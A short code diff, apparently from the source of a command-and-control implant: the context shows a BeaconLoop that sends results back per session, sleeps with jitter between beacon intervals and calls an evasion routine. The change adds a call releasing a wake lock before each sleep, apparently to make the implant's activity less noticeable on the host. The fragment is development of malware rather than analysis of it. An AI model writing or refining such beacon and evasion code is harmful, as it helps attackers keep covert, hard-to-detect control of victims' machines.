@@ -962,6 +962,8 @@ VOID BeaconLoop() {
                 SendResult(session.sessionId, result);
             }
 
+            // Release wake lock during sleep — reacquired by ReapplyEvasion next tick
+            ReleaseWakeLock();
             JitterSleep(config::BEACON_MIN, config::BEACON_MAX);
 
         } catch (const std::exception& e) {
